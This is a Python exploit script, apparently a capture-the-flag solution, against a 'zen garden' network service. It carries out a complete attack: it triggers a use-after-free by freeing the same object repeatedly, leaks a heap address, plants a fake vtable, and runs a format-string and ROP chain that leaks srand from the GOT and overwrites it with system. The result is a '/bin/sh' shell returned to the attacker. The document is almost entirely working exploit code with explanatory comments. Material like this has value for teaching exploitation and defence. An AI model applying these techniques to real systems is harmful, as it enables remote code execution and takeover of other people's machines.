from isis import *
import re

srand_got     = 0x804bb90
srand_plt     = 0x8048b30

pr            = 0x804a725
gets_plt      = 0x8048bb0
exit_plt      = 0x8048d90
simple_print  = 0x80491FF 
#We can use simple_print to manufacture a stack based buffer overflow
#AND an unconditional format string vulnerability. Oh the choices =D

my_srand      = 0x00335b0
my_system     = 0x003f430

their_srand   = 0x0033530 #from the exploit that targets the game machine
their_system  = 0x003f250 #from the exploit that targets the game machine

leak_srand    = lei(simple_print, pr, srand_got)
#use this to dereference the GOT
write_srand   = lei(gets_plt, pr, srand_got)
#this blocking call will let us rewrite the GOT
use_srand_ptr = lei(srand_plt, pr) 
#This will use the pointer from the GOT that we just overwrote

rop_chain     = leak_srand + write_srand+use_srand_ptr
command       = '/bin/sh;exit;'
#the address and argument to system comes after ropchain
#they need to be calculated at prgm runtime

def add_zen(socket,type,location,sign_message=None):
	socket.send('{} {} {}\n'.format('a',type,location))
	if(type=='s'):
		#If we're creating a sign there is an extra step.
		socket.send(sign_message+'\n')	

def del_zen(socket,location):
	socket.send('d {}\n'.format(location))
	

def perform_zen(socket,location):
	socket.send('p {}\n'.format(location))
	time.sleep(1)
	return socket.recv(0x10000)

def leak_heap(socket,location):
	add_zen(socket,'p',location)
	zen=perform_zen(socket,location)
	address=re.findall('( )(0x.*)(\n)',zen)[0][1]
	#del_zen(socket,4)
	return int(address,16)

def exploit(target):
	s=get_socket(target)
	
	exploit_code=lei(simple_print)+'%208x'+rop_chain

	add_zen(s,'r',0)    # add rake obj to slot 0

	for i in range(10):
		del_zen(s,0)# free the rake a bunch (vuln)

	add_zen(s,'r',1)    # Add a rake to slot 1
	#This rake occupies the same place in memory as the prev rake

	del_zen(s,0)
	#This frees the rake in slot 1 but allows us to keep a reference to it

	heap=leak_heap(s,4)
	#Leak heap allocates a reflecting pool and gives us a heap address

	print 'heap: {}'.format(hex(heap))
	#print the heap for debugging

	exploit_code += lei(heap+len( exploit_code )+0xc) 
	
       	#write argument to system, a pointer to command.
	#Added at the end of the exploit code.
	
	exploit_code += lei(exit_plt) # don't crash after shell exits
	
	exploit_code += command
	#write the string 

	replacement_vtable_ptr=lei(heap+4)
	add_zen(s,'s',2,replacement_vtable_ptr + exploit_code)
	#The sign we allocate here gets allocated over the rake we have a ref
	#to in slot 1. We use the information leak from the reflecting pool
	#to build a fake virtual method table and virtual method table pointer.

	#What we write into memory with Sign
	# vtable* to next dword
	# simple print as virtual method table entry
	# format string
	# ropchain ( simple_print(srand@GOT), gets(srand@GOT),
	#            srand@plt(command*), exit(random) )
	# command[]

	time.sleep(1) #such Zen, wow.

	lots_of_data = perform_zen(s,1)
        #When we perform the zen on the rake object it attemts to find the act
        #method at runtime using the virtual method table pointer that we ctrl.
        #We can use this to achieve arbitrary code execution.

	got=lots_of_data[lots_of_data.index(command)+len(command)+1:
		 lots_of_data.index(command)+len(command)+1 +4]
	#The four bytes after command (which is at the end of our dynamic
	#ropchain). Is what we leak with the first part of our rop chain.
	#We should currently be inside a blocking call to gets.
	
	srand_address ,= unpack("I",got)
	print 'srand : {}'.format(hex(srand_address))

	libc=srand_address - my_srand
	print 'libc : {}'.format(hex(libc))

	system_address=srand_address - my_srand + my_system
	print 'system : {}'.format(hex(system_address))
	

	s.send(lei(system_address)+'\n')
	#rewrite the got entry for srand and allow our ropchain to continue.
	print '\n***please enjoy a humble shell***\n'
	telnet_shell(s)


exploit(('localhost',2323))


